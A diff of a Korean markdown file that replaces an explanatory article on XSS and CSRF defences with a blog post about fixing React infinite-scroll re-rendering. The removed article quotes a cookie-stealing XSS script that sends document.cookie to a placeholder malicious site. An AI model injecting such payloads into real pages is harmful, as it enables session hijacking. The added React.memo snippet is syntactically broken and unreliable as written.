@@ -1,119 +1,836 @@
-# 1. 프론트엔드 주요 보안 이슈, XSS와 CSRF
+# 서론
 
-프론트엔드 개발에서 보안은 간과하기 쉬운 영역이지만, 웹 애플리케이션의 안전성과 사용자 데이터를 보호하기 위해 필수적인 요소이다. 특히 크로스 사이트 스크립팅(XSS)과 교차 사이트 요청 위조(CSRF)는 프론트엔드에서 자주 발생하는 주요 취약점으로, 각각 브라우저와 웹사이트 간의 신뢰 관계를 악용한다는 공통점이 있다.
+피드줍줍 서비스는 무한스크롤 방식으로 새로운 피드백을 불러와 화면에 보여준다. 그런데 어느 날 200개의 피드백을 스크롤하여 표시했을 때는 문제가 없었지만, 그 이상을 가져오자 화면이 버벅거리고 모달을 열 때도 한 박자 늦게 반응하는 현상이 발생했다. 이번 글에서는 이러한 성능 문제를 어떻게 발견했고, 어떤 과정을 거쳐 해결했는지 정리해 보려고 한다.
 
-XSS는 "브라우저가 웹 사이트를 신뢰해서 생기는 취약점"이다. 사용자가 입력한 악성 스크립트가 브라우저에서 실행되면서, 사용자 세션 하이재킹이나 민감한 데이터 유출을 초래할 수 있다. 반면, CSRF는 "웹 사이트가 브라우저를 신뢰해서 생기는 취약점"이다. 공격자는 사용자가 인지하지 못한 상태에서 악의적인 요청을 웹 사이트로 전송하게 만들어, 사용자의 의도와 무관한 데이터 변경이나 작업이 이루어지도록 한다.
+# 현재 구조
 
-# 2. 크로스 사이트 스크립팅 (XSS)
+우선 문제의 원인을 찾기 전, 문제가 발생하는 페이지인 `UserDashboard`페이지의 구조를 살펴보면 아래와 같다.
 
-## 2.1. XSS란?
+![image.png](attachment:ca9e1bae-0853-499d-8e17-ebe62389fd9a:image.png)
 
-크로스 사이트 스크립팅(XSS)은 웹 애플리케이션 보안에서 가장 흔하게 발견되는 취약점 중 하나로, 사용자 입력에 대한 적절한 검증 및 필터링이 부족할 때 발생한다. XSS는 웹 페이지에 삽입된 악성 스크립트가 브라우저에서 실행되도록 하여, 공격자가 사용자에게 부적절한 콘텐츠를 표시하거나, 사용자 권한을 가로채는 등의 악의적인 행동을 가능하게 한다. XSS는 주로 사용자가 신뢰하는 웹 사이트가 공격자의 악성 스크립트를 그대로 실행하도록 만드는 데 기인한다.
+이를 트리 구조로 바꿔서 보면 아래와 같다.
 
-## 2.2. XSS의 공격 예시
+![image.png](attachment:d17d56f6-c53c-42ec-937c-0f1fb61677ad:image.png)
 
-XSS 공격은 사용자가 방문한 웹사이트에서 악성 스크립트를 실행시키는 방식으로 이루어진다. 예를 들어, 공격자가 XSS 취약점이 존재하는 블로그에 게시글이나 댓글을 작성하면서 <script>alert('해킹됨');</script>와 같은 스크립트를 삽입했다고 가정해보자. 이 경우, 다른 사용자가 해당 페이지를 방문할 때 이 스크립트가 브라우저에서 실행되어 경고 창이 표시된다. 이 단순한 예시는 공격자가 악성 코드를 사용하여 웹사이트에서 무엇이든 실행할 수 있음을 보여준다.
+# 문제 찾기
 
-또 다른 예로, 한 쇼핑몰 사이트에서 리뷰 작성 기능이 있다고 가정해보자. 공격자가 리뷰 작성란에 <script>document.location='악성사이트?cookie='+document.cookie</script>와 같은 코드를 삽입한다면, 이 리뷰를 읽는 사용자의 세션 쿠키가 공격자의 사이트로 전송된다. 이 세션 쿠키를 통해 공격자는 사용자의 인증된 세션을 도용하여, 사용자의 계정에 접근하거나, 악의적인 행위를 할 수 있게 된다. 이러한 공격은 웹 애플리케이션에서 입력 데이터를 제대로 검증하지 않았을 때 발생할 수 있는 위험을 잘 보여준다.
+우선 문제의 원인을 찾기 위해서, 브라우저 메인 쓰레드의 과부화 상태를 확인하기 위해서 무한스크롤을 할 때, 브라우저 메인 쓰레드에 어떤 일이 일어나는 지 측정해봤다.
 
-## 2.3. XSS의 영향
+그 결과 아래와 같이 나왔다.
 
-XSS는 다양한 방식으로 웹 애플리케이션과 사용자의 보안을 위협한다. 가장 심각한 문제는 세션 하이재킹이다. 공격자는 사용자의 세션 쿠키를 가로채어, 사용자가 로그인한 상태를 도용할 수 있다. 이를 통해 공격자는 사용자의 권한을 무단으로 획득하여, 민감한 데이터에 접근하거나, 계정을 임의로 조작할 수 있다.
+![image.png](attachment:771c8599-f7c7-464e-8b06-64efa95d9ff8:image.png)
 
-또한, XSS를 이용해 사용자의 브라우저에서 악성 코드를 실행함으로써 사용자의 시스템에 직접적인 피해를 줄 수도 있다. 예를 들어, 공격자는 XSS를 통해 키로거(Keylogger)나 피싱 공격을 실행하는 스크립트를 삽입할 수 있다. 이러한 스크립트는 사용자가 입력하는 모든 키 입력을 기록하거나, 사용자로 하여금 가짜 로그인 페이지에 로그인하도록 유도하여 자격 증명을 탈취할 수 있다.
+결과를 살펴 보니, 메인 쓰레드의 일이 너무 많았고, 그 결과 16ms이내 한 프레임을 그리지 못하는 탓에 렉 걸리고 늦게 반응하는 현상이 발생했다. 함수 호출을 살펴보니, 새로운 피드백을 받아올 때 매번 기존 피드백들도 새롭게 리렌더링이 발생하고 있었다. 이는 리액트 devtools를 확인해봐도 알 수 있다. `Highlight updates when components render` 설정 옵션을 켜고 무한스크롤 시 렌더링을 측정해보았다.
 
-또한, XSS는 웹 애플리케이션의 신뢰도를 심각하게 저하시킬 수 있다. 공격자가 웹 사이트에 악성 콘텐츠를 삽입하면, 사용자는 해당 사이트를 신뢰하지 않게 되고, 이는 사이트의 평판에 큰 영향을 미친다. XSS는 단순히 기술적인 문제가 아니라, 사용자와 웹 애플리케이션 간의 신뢰 관계를 훼손하는 심각한 보안 위협으로 작용한다. 이러한 이유로 XSS는 모든 웹 개발자가 반드시 이해하고, 방어해야 하는 중요한 보안 이슈이다.
+[화면 기록 2025-09-20 20.10.58.mov](attachment:8efc4dee-ae48-461c-9763-4964173d2eda:화면_기록_2025-09-20_20.10.58.mov)
 
-## 2.4. XSS 취약점 대책
+그 결과 매번 새로운 피드백을 받아올 때, 모든 컴포넌트가 새롭게 렌더링되는 것을 확인할 수 있었다. **Profiler**로 확인해보면 더 명확하다.
 
-### 1. 입력 데이터의 검증
+![image.png](attachment:37ce8791-611f-433f-95e6-cef43d1253d1:image.png)
 
-사용자 입력 데이터의 검증은 XSS 방지를 위한 가장 중요한 단계 중 하나이다. 웹 애플리케이션은 모든 사용자 입력을 신뢰해서는 안 되며, 입력된 데이터가 악의적인 의도를 가지고 있을 가능성을 항상 염두에 두어야 한다. 따라서, 모든 사용자 입력은 반드시 철저하게 검증되고, 필터링되어야 한다.
+새로 피드백을 받아올 때, `UserDashboard` 페이지 컴포넌트 전체가 렌더링되는 것을 확인할 수 있다.
 
-첫 번째로, 사용자 입력을 HTML 콘텐츠에 직접 삽입하기 전에 특수 문자를 이스케이프 처리해야 한다. 이는 <, >, &, ", ' 등의 특수 문자가 HTML 태그나 속성으로 인식되는 것을 방지하기 위한 조치이다. 이러한 문자가 변환되지 않고 그대로 브라우저에 전달되면, 공격자가 삽입한 스크립트가 그대로 실행될 수 있기 때문이다. 예를 들어, <script> 태그와 같은 입력이 그대로 HTML에 삽입되면, 브라우저는 이를 스크립트로 인식하고 실행하게 된다. 이스케이프 처리를 통해 이러한 입력은 단순한 텍스트로 변환되어, 스크립트가 실행되지 않게 된다.
+### 이게 왜 문제가 될까?
 
-또한, 입력 데이터의 길이와 유형을 제한하는 것도 중요하다. 예를 들어, 이메일 주소나 전화번호와 같이 명확한 형식이 필요한 입력의 경우, 정규 표현식을 사용해 입력된 데이터가 기대하는 형식에 맞는지 검증할 수 있다. 이렇게 함으로써, 공격자가 의도적으로 악성 코드를 입력하는 것을 사전에 차단할 수 있다. 또한, 필요 이상으로 긴 입력을 허용하지 않음으로써, 악의적인 스크립트가 대규모로 삽입되는 것을 방지할 수 있다.
+우선 브라우저 메인 쓰레드의 1프레임을 그림으로 알아보면 아래와 같다.
 
-마지막으로, 서버와 클라이언트 측에서 모두 검증을 수행하는 것이 바람직하다. 클라이언트 측 검증은 사용자 경험을 개선하고 빠른 피드백을 제공할 수 있지만, 이를 우회하는 방법이 존재하기 때문에 서버 측에서도 반드시 추가 검증이 이루어져야 한다. 서버 측 검증은 최종 방어선으로서, 클라이언트 측에서 처리되지 않은 악성 입력이 서버에 도달하는 것을 막아줄 수 있다. 이를 통해 잠재적인 XSS 공격의 위험을 최소화할 수 있다.
+![image.png](attachment:ffbd03fa-a3b0-47e1-b2c3-54a170c06864:image.png)
 
-### 2. HTML 요소 속성의 보호
+메인 쓰레드는 저 하나의 사이클(1프레임)을 16ms 이내에 완료해야지 사용자에게 부드러운 화면을 보여줄 수 있다. 만약 하나의 사이클(1프레임)이 16ms 가 넘어가게 되면 내가 겪은 문제인 사용자 이벤트 처리 지연과 프레임 드랍과 같은 문제가 발생한다. 지금 내 코드에서는 새로운 데이터를 불러올 때마다, 기존의 데이터를 사용하던 UserFeedback 전체가 렌더링되고 있다. 즉 10개의 새로운 데이터만을 추가적으로 들고왔지만 기존 200개의 데이터를 사용하는 컴포넌트도 다시 계산되고 있다는 뜻이다. 이렇게 되면 메인 쓰레드는 불필요한 계산 때문에 리액트 렌더링에 많은 시간을 사용하게 된다. 그렇기 때문에 이후 작업들이 딜레이 되면서 문제가 되었던 것이다.
 
-HTML 요소 속성에 사용자 데이터를 삽입할 때는 특별한 주의가 필요하다. 속성 값에 사용자 입력이 직접 삽입될 경우, 이는 XSS 공격에 노출될 수 있는 경로가 된다. 예를 들어, 사용자가 입력한 데이터가 href, src, title 등의 속성 값으로 사용될 때, 이 데이터를 반드시 따옴표로 감싸고, 이스케이프 처리를 통해 특수 문자가 코드로 실행되지 않도록 해야 한다. 이를 통해 공격자가 악의적인 스크립트를 삽입하는 것을 효과적으로 방지할 수 있다.
+<aside>
 
-특히 href 속성의 경우, 사용자가 입력한 URL이 http:나 https:로 시작하는지 확인해야 한다. 이를 통해 javascript:와 같은 악성 스키마가 사용되지 않도록 할 수 있다. 속성 값에 삽입되는 모든 입력 데이터는 신뢰할 수 없는 사용자로부터 입력된 것이므로, 철저한 검증과 필터링이 필요하다.
+왜 16.67ms일까?
 
-### 3. DOM 조작 보호
+일반적으로 모니터의 주사율은 60Hz, 즉 1초에 60번 화면을 갱신한다. 이는 곧 1초(1000ms)를 60으로 나눈 값, 약 **16.67ms마다 한 번씩 새로운 프레임을 그린다**는 의미다. 만약 한 프레임의 렌더링이나 연산이 16.67ms를 초과하면, 그 프레임은 제때 화면에 그려지지 못하고 다음 주기에 밀려나면서 화면이 끊기거나 사용자 입력 반응이 늦어지는 문제가 발생한다. 따라서 **60FPS를 안정적으로 유지하려면 각 프레임 처리를 반드시 16.67ms 이내에 끝내야 한다.**
 
-DOM 조작 시에도 XSS 공격에 대한 방어가 중요하다. 사용자의 입력을 동적으로 HTML 요소에 삽입할 때, innerHTML과 같은 메서드는 가능한 한 사용하지 않아야 한다. 이 메서드는 입력된 HTML 코드가 그대로 파싱되어 실행되기 때문에, 악의적인 스크립트가 포함될 수 있다. 대신, appendChild, textContent, createElement 등의 메서드를 사용해 DOM을 조작하는 것이 안전하다.
+</aside>
 
-이러한 메서드는 입력된 데이터를 단순한 텍스트로 처리하거나, 요소를 명확하게 생성해 삽입하기 때문에, 공격자가 악성 스크립트를 주입하는 것을 방지할 수 있다. 또한, DOM 조작 과정에서 사용자 입력이 HTML 속성에 들어가는 경우, 반드시 앞서 언급한 대로 이스케이프 처리와 검증을 수행해야 한다. 이렇게 하면 동적으로 생성된 콘텐츠도 안전하게 렌더링할 수 있다.
+실제 코드로 살펴보자.
 
-### 4. Content Security Policy(CSP) 적용
+```tsx
+export default function **UserDashboard**() {
+  const apiUrl = '~~~'
+  const {
+	  // feedback 정보를 가지는 상태
+    **items: feedbacks,**
+    fetchMore,
+    hasNext,
+    loading,
+  } = useCursorInfiniteScroll<
+    FeedbackType,
+    'feedbacks',
+    FeedbackResponse<FeedbackType>
+  >({
+    url: apiUrl,
+    key: 'feedbacks',
+    size: 10,
+    enabled: shouldUseInfiniteScroll,
+  });
 
-Content Security Policy(CSP)는 XSS와 같은 공격을 방지하기 위한 강력한 보안 메커니즘이다. CSP는 웹 애플리케이션이 실행할 수 있는 콘텐츠의 출처를 제어하여, 악의적인 스크립트가 브라우저에서 실행되는 것을 차단한다. 이를 통해 개발자는 자신이 신뢰하는 출처에서만 스크립트를 불러올 수 있도록 제한할 수 있으며, 인라인 스크립트나 외부 소스에서 로드되는 스크립트의 실행을 막을 수 있다.
+  return (
+    <div css={dashboardLayout}>
+      <DashboardOverview />
+      <FilterSection />
+      <div>
+        <FeedbackBoxList>
+          {feedbacks.map((feedback: FeedbackType) => (
+            <UserFeedback
+             {...feedback}
+            />
+          ))}
+        </FeedbackBoxList>
+      ...
+    </div>
+  );
+}
+```
 
-CSP를 적용할 때는 'unsafe-inline'과 같은 비안전한 지시자를 사용하지 않는 것이 중요하다. 대신 nonce-source나 hash-source를 사용하여 인라인 스크립트가 허용될 때도 안전하게 실행되도록 설정할 수 있다. 또한, 특정 리소스 유형에 대해 script-src, style-src, img-src 등의 지시자를 설정하여, 신뢰할 수 있는 출처에서만 해당 리소스를 로드하게끔 제어할 수 있다. 이를 통해 XSS를 포함한 다양한 코드 인젝션 공격을 예방할 수 있다.
+위 코드는 실제 코드를 간략화한 버전이다. 코드를 살펴보면 무한스크롤로 가져오는 피드백 상태인 `feedbacks` 상태를. `UserDashboard` 에서 관리해서 발생한 문제임을 알 수 있다.
 
-CSP는 테스트와 모니터링을 통해 지속적으로 개선되어야 한다. 초기에는 'Report-Only' 모드를 사용하여 CSP 설정이 제대로 작동하는지 확인하고, 문제점을 파악한 후에 실제 정책을 적용하는 것이 좋다. 또한, CSP는 설정 후에도 공격 시도가 발생할 경우 보고서를 수집하여, 새로운 위협에 대응할 수 있도록 지속적으로 관리해야 한다. 이렇게 함으로써, 웹 애플리케이션의 보안을 한층 강화할 수 있다.
+무한스크롤로 새로운 피드백을 가져오면 `feedbacks` 상태가 바뀌고 상태가 바뀌니 상태를 가진 `UserDashboard` 컴포넌트가 랜더링되면서 하위에 존재하는 모든 컴포넌트가 렌더링 되면서 발생한 문제였다.
 
-### 5. XSS 예방 라이브러리 사용
+즉 문제 상황을 정리해보면 다음과 같다.
 
-XSS를 효과적으로 방어하기 위해서는 검증된 라이브러리를 사용하는 것이 중요하다. DOMPurify와 같은 라이브러리는 사용자가 입력한 데이터를 철저히 필터링하여, 잠재적으로 위험한 HTML 태그와 속성을 제거함으로써 XSS 공격을 방지한다. 이 라이브러리는 사용하기 간편하면서도 강력한 보호 기능을 제공하여, 개발자가 안전하게 사용자 콘텐츠를 처리할 수 있도록 돕는다.
+1. `feedbacks` 상태가 `UserDashboard`에서 관리되어서 불필요하게 다른 컴포넌트가 렌더링되는 문제
+2. 새로운 피드백을 가져와서 렌더링 될 때, 같은 데이터를 사용하는 `UserFeedback` 컴포넌트도 모두 새롭게 계산 되는 문제
 
-DOMPurify는 다양한 설정 옵션을 제공하여 개발자가 애플리케이션의 요구에 맞게 필터링 규칙을 커스터마이즈할 수 있다. 예를 들어, 특정 태그나 속성만 허용하거나, 스크립트와 같이 악성 코드가 포함될 수 있는 요소를 완전히 제거하는 식으로 설정할 수 있다. 이를 통해 애플리케이션의 보안 수준을 높이고, 사용자가 악의적인 입력을 통해 시스템에 해를 끼치는 것을 방지할 수 있다.
+# 문제 해결1 - 구조 개선
 
-최신 웹 브라우저에서 제공하는 Sanitizer API를 활용하는 것도 좋은 방법이다. Sanitizer API는 브라우저 내장 보안 기능으로, XSS와 같은 보안 위협으로부터 사용자를 보호하기 위해 고안되었다. 이 API는 브라우저 레벨에서 콘텐츠를 안전하게 처리하며, 사용자 입력을 DOM에 삽입하기 전에 자동으로 검증한다. 이러한 도구를 활용하면, 개발자는 XSS와 같은 취약점을 보다 효과적으로 방어할 수 있다.
+첫번 째 문제인 “`feedbacks` 상태가 `UserDashboard`에서 관리되어서 불필요하게 다른 컴포넌트가 렌더링되는 문제”는 구조를 개선해서 해결했다.
 
-# 3. 교차 사이트 요청 위조 (CSRF)
+다시 현재 구조를 간략화하게 살펴보면 아래와 같다.
 
-## 3.1. CSRF란?
+![image.png](attachment:cf961f3a-065d-4a6b-ae1e-b3710f735e02:image.png)
 
-교차 사이트 요청 위조(CSRF)는 사용자가 신뢰하는 웹사이트에 대해, 사용자의 의도와는 다른 악의적인 요청을 수행하도록 유도하는 공격 기법이다. 이 공격은 사용자가 웹사이트에 이미 로그인된 상태에서 발생하며, 공격자가 사용자의 브라우저를 통해 웹사이트로 요청을 전송하게 만들어 서버가 이를 정상적인 요청으로 처리하도록 만든다. 결과적으로, 서버는 이러한 요청을 신뢰된 사용자로부터 온 것이라 간주하고, 사용자의 권한 하에 민감한 작업을 수행하게 된다.
+구조를 개선하기 위해서 feedbacks란 상태를 올바른 위치로 옮겨주어야 한다. 지금은 UserFeedback 컴포넌트들에만 사용되므로 우선 map 메서드로 그냥 렌더링 했던 UserFeedback 컴포넌트들을 UserFeedbackList 컴포넌트로 묶고 feedbacks란 상태를 UserFeedbackList 컴포넌트로 옮겨주었다. 이렇게 구조를 개선하고 다시 살펴보면 다음과 같다.
 
-CSRF 공격은 웹사이트가 사용자의 브라우저를 신뢰하는 점을 악용한다. 예를 들어, 사용자가 인터넷 뱅킹에 로그인한 상태에서 공격자가 준비한 악성 웹 페이지를 방문하면, 그 페이지는 사용자의 브라우저를 통해 이체 요청을 자동으로 전송할 수 있다. 이 과정에서 사용자는 자신의 계좌에서 돈이 이체된다는 사실을 전혀 인지하지 못한다. 이러한 공격은 사용자가 특정한 행동을 취하지 않더라도, 단순히 악성 페이지를 방문하거나, 공격자가 만든 링크를 클릭하는 것만으로도 실행될 수 있다.
+![image.png](attachment:830c46b5-134c-478e-b15c-35c117c3558f:image.png)
 
-## 3.2. CSRF의 공격 예시
+실제 코드로도 살펴보자. 이전에 데이터 패칭과 `feedbacks`라는 상태가 `UserFeedbackList` 컴포넌트 내부로 들어가 `UserDashboard` 컴포넌트 자체가 상당히 가벼워지고, 훨씬 더 이해하기 좋은 형태로 변경되었다.
 
-CSRF 공격의 한 예시는 사용자가 이미 로그인된 상태에서 특정 웹사이트의 악성 링크를 클릭하는 상황이다. 예를 들어, 공격자는 사용자가 자주 방문하는 포럼에 악성 링크를 게시할 수 있다. 이 링크는 사용자가 클릭하는 즉시, 그의 브라우저를 통해 인터넷 뱅킹 사이트에 자동 이체 요청을 보낸다. 사용자는 이 요청이 자신도 모르게 실행되었기 때문에, 자신의 계좌에서 자금이 이체되는 사실을 알지 못한다. 이처럼 CSRF 공격은 사용자의 인증 상태를 악용하여 의도하지 않은 작업을 수행하게 만든다.
+```tsx
+export default function **UserDashboard**() {
 
-또 다른 예시로는, 공격자가 조작한 이메일 링크를 통해 CSRF를 실행하는 경우가 있다. 사용자가 링크를 클릭하면, 해당 링크는 사용자가 로그인된 상태인 전자 상거래 사이트에서 자동으로 주문을 생성하거나, 배송 주소를 변경하는 요청을 보낸다. 사용자는 이러한 변경 사항을 인지하지 못하고, 주문이 잘못된 주소로 배송되는 등 큰 피해를 입을 수 있다. 이러한 공격은 사용자가 자신의 브라우저에서 실행되는 모든 요청을 신뢰할 수 없다는 점을 명확히 보여준다.
+  return (
+    <div css={dashboardLayout}>
+      <DashboardOverview />
+      <FilterSection />
 
-## 3.3. CSRF의 영향
+      /*fedbacks 상태와 UserFeedback컴포넌트들을 UserFeedbackList컴포넌트로 묶어주기*/
+      <UserFeedbackList />
+    </div>
+  );
+}
+```
 
-CSRF는 사용자의 개인 정보와 자산을 심각하게 위협할 수 있는 취약점이다. 공격자는 CSRF를 통해 사용자가 의도하지 않은 작업을 수행하게 만들 수 있으며, 이는 웹 애플리케이션의 기능과 데이터 무결성에 큰 영향을 미친다. 예를 들어, 금융 서비스에서 CSRF 공격이 발생할 경우, 사용자의 자금이 무단으로 이체되거나, 중요한 계좌 정보가 변경될 수 있다. 이러한 피해는 경제적인 손실로 직결될 뿐만 아니라, 사용자의 신뢰를 완전히 잃게 만드는 원인이 된다.
+이렇게 하고, Profiler를 다시 확인해본 결과 다음과 같이 이제는 불필요하게 다른 컴포넌트가 렌더링되는 것을 막을 수 있었고, 렌더링 범위를 `UserFeedbackList` 컴포넌트로 좁힐 수 있었다.
 
-또한, CSRF는 소셜 미디어나 이메일 서비스에서도 큰 영향을 미칠 수 있다. 공격자는 CSRF를 통해 사용자의 계정으로 무단 게시물을 작성하거나, 사용자 모르게 비밀번호를 변경하여 계정을 탈취할 수 있다. 이로 인해 사용자는 자신의 온라인 정체성을 잃거나, 원치 않는 콘텐츠가 자신의 이름으로 퍼지게 되는 상황에 직면할 수 있다. 이러한 결과는 단순히 개인적인 피해를 넘어서, 사회적 신뢰와 평판에도 심각한 영향을 미친다. CSRF의 피해는 눈에 보이지 않게 누적되며, 문제를 인지한 후에는 이미 큰 피해가 발생한 경우가 많아, 이에 대한 예방이 무엇보다 중요하다.
+![image.png](attachment:7c581549-a1a4-4e36-86c9-74ab6d077706:image.png)
 
-## 3.4. CSRF 취약점 대책
+이렇게 1번 문제인 “`feedbacks` 상태가 `UserDashboard`에서 관리되어서 불필요하게 다른 컴포넌트가 렌더링되는 문제”를 해결했다.
 
-### 1. CSRF 토큰 사용
+# 문제 해결2 - react api 사용
 
-CSRF 방어의 핵심 전략 중 하나는 원타임 토큰(One-Time Token)을 활용하여 요청과 서버 간의 일치 여부를 검증하는 것이다. 이 토큰은 서버가 사용자 세션에 고유하게 생성한 값으로, 각 요청마다 포함되어야 한다. 서버는 요청을 처리하기 전에 이 토큰이 유효한지 확인한다. 이를 통해 서버는 요청이 사용자의 브라우저에서 직접 발생했는지, 또는 외부에서 조작된 것인지를 검증할 수 있다.
+이제 2번 문제인 “새로운 피드백을 가져와서 렌더링 될 때, 같은 데이터를 사용하는 `UserFeedback` 컴포넌트도 모두 새롭게 계산 되는 문제”를 해결해 보자.
 
-CSRF 토큰은 주로 폼에 숨김 필드로 포함된다. 사용자가 폼을 제출하면, 토큰이 함께 전송되어 서버에서 검증된다. 이렇게 함으로써 공격자가 외부에서 동일한 요청을 모방하더라도, 유효한 토큰이 없으면 요청이 처리되지 않는다. 이는 사용자가 정상적인 경로를 통해 요청을 보냈는지를 확인하는 중요한 보안 절차이다.
+앞서 `UserFeedbackList` 컴포넌트로 묶고 feedbacks란 상태를 해당 컴포넌트에 넘겨도 아직도 발생하는 문제인 기존 데이터 즉 똑같은 데이터를 사용해도 발생하는 렌더링 문제다. 사실 우리 서비스의 렉을 유발하는 핵심 문제는 이거다.
 
-이 토큰은 단순한 값이 아니라, 복잡하고 예측 불가능한 값이어야 하며, 매 세션마다 변경되는 것이 바람직하다. 세션이 시작될 때마다 새로운 토큰이 생성되거나, 각 요청 시마다 새롭게 발급되어야 한다. 이렇게 하면 공격자가 특정 토큰을 획득하더라도 이를 재사용할 수 없게 되어, CSRF 공격의 성공 가능성을 크게 낮출 수 있다. 이는 CSRF 공격을 방지하는 데 있어 중요한 보안 계층을 추가하는 역할을 한다.화할 수 있다.
+사실 이거는 생각보다 쉽게 해결할 수 있다. 기존 데이터를 사용하는 경우 즉 props가 이전 렌더링과 동일하다면 렌더링 되는 것을 막아주는 React api에서 제공하는 `React.memo`를 사용해주면 된다.
 
-### 2. SameSite Cookie 속성 사용
+```tsx
 
-CSRF 공격을 방지하는 또 다른 중요한 방법은 쿠키의 SameSite 속성을 사용하는 것이다. 이 속성은 쿠키가 요청과 함께 전송되는 방식을 제어하여, 교차 사이트 요청이 쿠키를 포함할 수 없도록 제한한다. SameSite 속성은 Lax, Strict, 또는 None으로 설정할 수 있으며, 기본적으로는 Lax로 설정하여 대부분의 경우에 안전한 보호를 제공한다.
+export default function **React.memo**(UserFeedback({
+ ...
+}: UserFeedbackBox) {
+  const theme = useAppTheme();
 
-SameSite=Lax는 사용자가 링크를 클릭하거나 GET 요청을 통해 사이트를 탐색할 때 쿠키가 전송되도록 허용하지만, POST 요청과 같은 민감한 작업에는 쿠키가 포함되지 않도록 한다. 이는 사용자가 외부 사이트에서 특정 링크를 클릭하는 일반적인 사용 사례를 보호하면서도, CSRF 공격의 가능성을 줄이는 데 효과적이다. SameSite=Strict로 설정하면, 모든 외부 요청에 대해 쿠키가 전송되지 않아, CSRF 공격에 대한 보호가 더욱 강화된다.
+  return (
+    <FeedbackBoxBackGround type={type} customCSS={customCSS}>
+      <FeedbackBoxHeader
+        userName={userName + (isMyFeedback ? ' (나)' : '')}
+        type={type}
+        feedbackId={feedbackId}
+        category={category}
+      />
+      ...
+      <FeedbackBoxFooter
+        type={type}
+        isLiked={isLiked}
+        postedAt={postedAt}
+        isSecret={isSecret}
+        feedbackId={feedbackId}
+        likeCount={likeCount}
+      />
+    </FeedbackBoxBackGround>
+  );
+})
 
-하지만, SameSite=Strict는 사용자 경험에 영향을 미칠 수 있어, 모든 상황에서 적합하지는 않다. 반면, SameSite=Lax는 보안과 사용자 경험의 균형을 잘 맞추는 옵션으로, 대부분의 웹 애플리케이션에서 권장된다. 특정 상황에서는 SameSite=None을 사용하여 쿠키가 교차 사이트 요청에서도 전송되도록 설정할 수 있지만, 이 경우 반드시 Secure 속성도 함께 사용하여 HTTPS 연결에서만 쿠키가 전송되도록 해야 한다. 이를 통해 CSRF 공격에 대한 강력한 방어를 유지하면서도, 필요한 경우 유연성을 제공할 수 있다.
+```
 
-### 3. Double Submit Cookie 기법
+위 코드와 같이 UserFeedback 컴포넌트를 React.memo로 감싼 컴포넌트를 내보내도록 설정했다.
 
-Double Submit Cookie 기법은 CSRF 공격을 방어하기 위한 효과적인 방법 중 하나로, CSRF 토큰을 두 번 제출하는 방식을 사용한다. 이 기법에서는 서버가 사용자의 브라우저에 CSRF 토큰을 포함하는 쿠키를 발급하고, 클라이언트는 이 토큰을 폼 데이터나 요청 헤더에 포함시켜 서버에 다시 전송한다. 서버는 요청이 들어오면, 쿠키에 저장된 토큰과 폼이나 헤더에 포함된 토큰이 일치하는지 확인한다.
+<aside>
 
-이 방법은 서버가 CSRF 토큰을 관리하는 방식과 달리, 쿠키와 폼 데이터 간의 일치 여부를 검사하여 CSRF 공격을 방어한다. 공격자는 CSRF 토큰이 포함된 쿠키를 위조할 수 없으며, 일치하는 토큰 값을 알지 못하기 때문에, 이 기법은 CSRF 공격을 효과적으로 차단한다. 또한, 이 기법은 서버 측에서 특별한 상태 정보를 유지할 필요가 없어 구현이 비교적 간단하다.
+React.memo란?
 
-하지만 Double Submit Cookie 기법은 쿠키의 보안 설정이 중요하다. 쿠키가 JavaScript에서 접근 가능하지 않도록 HttpOnly 속성을 사용해야 하며, Secure 속성을 통해 HTTPS 연결에서만 쿠키가 전송되도록 설정해야 한다. 이러한 보안 설정을 통해 쿠키가 클라이언트 측에서 노출되는 것을 방지하고, CSRF 공격에 대한 방어력을 더욱 강화할 수 있다.
+React.memo는 props가 바뀌지 않으면 컴포넌트가 렌더링을 건너뛰게 해주는 고차 컴포넌트다.
 
-### 4. 출처 검증
+</aside>
 
- CSRF 공격을 방지하는 또 다른 중요한 방법은 출처 검증(Origin Verification)이다. 출처 검증은 서버가 요청의 출처(Origin)와 Referer 헤더를 확인하여, 요청이 신뢰할 수 있는 출처에서 온 것인지 판단하는 방식이다. 웹 브라우저는 요청을 보낼 때 출처와 Referer 헤더를 자동으로 포함시키며, 서버는 이를 바탕으로 요청의 유효성을 검사할 수 있다.
+이렇게 코드를 수정하고 다시 Profiler를 측정해본 결과 새로 가져오는 피드백만 렌더링이 발생했다.
 
-출처 검증은 특히 중요한 작업에서 유용하다. 예를 들어, 민감한 데이터 수정이나 결제 요청과 같은 작업에서 출처가 올바른지 확인함으로써, 외부 사이트에서 발생한 의도하지 않은 요청을 차단할 수 있다. 이 방법은 CSRF 공격을 사전에 방어하는 강력한 수단이 된다.
+![image.png](attachment:e8e3bf45-08a9-4cec-a567-8da892008704:image.png)
 
-이 방식의 핵심은, 서버가 허가된 출처 리스트를 유지하고, 그 리스트에 포함되지 않은 출처에서 온 요청은 모두 거부하는 것이다. 이를 통해, 공격자가 임의의 사이트에서 보내는 CSRF 요청이 효과를 발휘하지 못하도록 막을 수 있다. 그러나, Referer 헤더는 일부 환경에서 제거되거나 수정될 수 있으므로, 출처 검증은 CSRF 방어 전략의 하나로 사용되며, 다른 방법들과 함께 적용하는 것이 권장된다.
+# 결과
+
+이렇게 최적화를 완료했다. 최적화 전과 후를 비교해보자. 전에는 모든 컴포넌트가 렌더링 되었지만 최적화 후에는 꼭 필요한 부분인 새롭게 피드백을 가져오는 부분만 렌더링이 발생했다.
+
+![image.png](attachment:9aa16447-16fa-4a08-ab26-e7b4bd9fafeb:image.png)
+
+이런 최적화 결과는 개발자 도구 성능 탭에서도 크게 체감할 수 있었다.
+
+![image.png](attachment:6adb861a-8ceb-49be-a6aa-2858f4615d90:image.png)
+
+최적화 전에는 브라우저 메인 쓰레드에 무수히 많은 작업이 존재하고 많은 프레임 드랍이 존재했지만, 최적화 후에는 프레임 드랍과 메인 쓰레드의 작업이 눈에 띄게 줄어든 것을 확인할 수 있었다.
+
+## 대시보드 무한스크롤
+
+### 전체 페이지가 리렌더링되는 문제
+
+무한 스크롤시 그냥 모든 관리자 대시보드 컴포넌트가 리랜더링이 발생한다.
+
+![image.png](attachment:a791eb0a-c2a8-4433-a7d5-8b3a89f4ea00:image.png)
+
+위 이미지는 무한스크롤 순간을 profiler로 측정한 것으로 이전 피드백 데이터와 심지어 관리자 통계마저 리랜더링이 발생하는 것을 볼 수 있다.
+
+사실 당연한 결과인데, 피드백 데이터를 받아오는 과정에서 `AdminDashboard`가 리렌더링이 되고 있다.
+
